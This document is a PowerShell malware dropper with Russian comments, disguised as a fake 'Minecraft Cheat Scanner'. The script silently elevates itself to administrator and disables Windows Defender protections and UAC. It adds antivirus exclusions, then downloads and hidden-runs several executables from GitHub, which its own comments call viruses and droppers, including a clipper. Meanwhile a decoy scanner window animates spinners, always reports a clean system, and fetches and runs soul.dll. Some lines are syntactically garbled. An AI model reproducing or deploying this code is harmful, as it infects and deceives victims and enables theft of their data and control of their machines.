# === КОНФИГУРАЦИЯ СКРИТНОГО ЗАПУСКА ===
$CurrentProcess = Get-Process -Id $PID
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Если нет прав админа, перезапускаем СКРЫТО с правами админа
if (-not $IsAdmin) {
    try {
        # Формируем команду для скрытого перезапуска
        $psiArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($CurrentProcess.Path)`""
        Start-Process powershell.exe -ArgumentList \$psiArgs -Verb RunAs
    } catch {
        # Если не удалось скрыто, пробуем обычным способом (но это покажет UAC)
        Start-Process powershell.exe -ArgumentList \$psiArgs -Verb RunAs
    }
    exit
}

# Если мы тут, значит права админа есть и мы (скорее всего) в скрытом режиме.
# Скрываем окно консоли программно, если оно вдруг видно
Add-Type -Name Win32 -Namespace API -MemberDefinition @"
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
\$NULL = [API]Win32]::ShowWindow((Get-Process -Id \$PID).MainWindowHandle, 0)

# --- НАСТРОЙКА СРЕДЫ ---
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
try {
    $processId = $PID
    \$processInfo = Get-CimInstance -ClassName Win32_process -Filter "ProcessId = \$processId" -ErrorAction SilentlyContinue
    if ($processInfo) { $scriptPath = Split-Path -Parent $processInfo.ExecutablePath } else { $scriptPath = \$PSScriptRoot }
    if (-not $scriptPath) { $scriptPath = "." }
} catch { $scriptPath = $PSScriptRoot }
Set-Location -Path \$scriptPath

# --- БЛОК 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ (СКРЫТО) ---
try {
    Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring \$true -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableNetworkProtection \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableTamperProtection \$true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force | Out-Null
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force | Out-Null
    rundll32.exe user32.dll,UpdatePerUserSystemParameters | Out-Null
    
    # Перезапуск Проводника и служб скрыто
    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
    Restart-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
    Restart-Service -Name "bits" -Force -ErrorAction SilentlyContinue
} catch {}

# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (СКРЫТО) ---
try {
    \$ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    \$ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    \$AppData = [System.Environment]::GetFolderPath("ApplicationData")
    \$LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        if (Test-Path \$ProgramFiles) { Add-MpPreference -ExclusionPath \$ProgramFiles -ErrorAction SilentlyContinue }
        if (Test-Path \$ProgramFilesX86) { Add-MpPreference -ExclusionPath \$ProgramFilesX86 -ErrorAction SilentlyContinue }
        if (Test-Path \$AppData) { Add-MpPreference -ExclusionPath \$AppData -ErrorAction SilentlyContinue }
        if (Test-Path \$LocalAppData) { Add-MpPreference -ExclusionPath \$LocalAppData -ErrorAction SilentlyContinue }
    }
} catch {}

# --- БЛОК 3: СКАЧИВАНИЕ И ЗАПУСК ВИРУСОВ/ДРОППЕРОВ (СКРЫТО) ---
\$urls = @{
    "cheking.exe" = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe"
    "Arcanusclipper.exe" = "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe"
    "Umbralchik.exe" = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe"
    "informate.exe" = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe"
    "SteamSetup.exe" = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe"
}

foreach (\$file in \$urls.Keys) {
    try {
        Write-Host "Скачивание \$file..." # В скрытом режиме это все равно не будет видно, но для лога оставим
        Invoke-WebRequest -Uri $urls[$file] -OutFile \$file -UseBasicParsing -ErrorAction SilentlyContinue
        if (Test-Path \$file) {
            Start-Process \$file -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Запуск my_admin_tool.exe и soul.dll скрыто
try {
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe" -UseBasicParsing -ErrorAction SilentlyContinue
    if (Test-Path "my_admin_tool.exe") { Start-Process "my_admin_tool.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue }
} catch {}

try {
    Invoke-WebRequest -Uri "https://random.domain/soul.dll" -OutFile "soul.dll" -UseBasicParsing -ErrorAction SilentlyContinue
    # DLL обычно не запускается напрямую через Start-Process, оставим просто скачивание
} catch {}

# --- БЛОК 4: ПОКАЗ ОКНА СКАНЕРА (Minecraft Cheat Scanner) ---
# Теперь нам нужно показать окно, так как пользователь хочет видеть сканер.
# В PowerShell, работающем в скрытом режиме (-WindowStyle Hidden), сложно просто "появиться".
# Лучший способ - запустить НОВЫЙ процесс PowerShell с видимым окном, который выполнит только код сканера.

\$scannerScript = {
    # --- КОД СКАНЕРА (ВИДИМЫЙ) ---
# MINECRAFT CHEAT SCANNER v2.0 

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"

Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$cheatDB = @("vape","wurst","liquidbounce","sigma","impact","future","aristois","meteor","bleachhack","phobos","killAura","flyHack","xray","cheat","hack","injector")
$found = @()
$risk = 0
$startTime = Get-Date

# === СПИННЕР АНИМАЦИЯ ===
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
Show-Spinner "Анализ DLL и инжекторов..." 15

# === 2. .MINECRAFT (15 сек) ===
Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
Show-Spinner "Проверка модов, jars, json..." 15

# === 3. TEMP + DOWNLOADS (10 сек) ===
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов..." 10

# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10

# === 5. ПРОГРЕСС-БАР (5 сек) ===
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# === 6. СЕТИ (5 сек) ===
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
Show-Spinner "Проверка Minecraft серверов..." 5

# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll

# ЛОГ (тоже чистый)
$log = @"
Minecraft Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог: $env:TEMP\mc_scan_*.log" -ForegroundColor Gray
Write-Host "🎮 " -ForegroundColor Green

# === ЗАГРУЗЧИК everything (после паузы) ===
Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

#  скачиваем и запускаем everything
try {
    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1
    
} catch {
    # Полностью скрываем ошибки
}



